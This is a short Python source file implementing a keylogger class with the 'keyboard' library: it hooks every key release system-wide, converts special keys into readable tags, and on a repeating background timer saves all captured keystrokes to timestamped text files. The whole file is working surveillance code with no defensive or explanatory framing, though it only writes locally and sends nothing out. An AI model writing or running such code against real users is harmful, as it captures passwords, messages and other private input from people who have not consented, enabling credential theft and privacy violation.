import keyboard as kbd
from threading import Timer
from datetime import datetime

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_file(self):
        fileName = str(datetime.now())[0:19].replace(" ","_").replace(":","-")
        with open(f"{fileName}.txt", "w") as theFile:
            print(self.log, file=theFile)
        print(f"Saved {fileName}.txt")

    def report(self):
        if self.log:
            self.report_to_file()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
      kbd.on_release(callback=self.callback)
      self.report()
      kbd.wait()
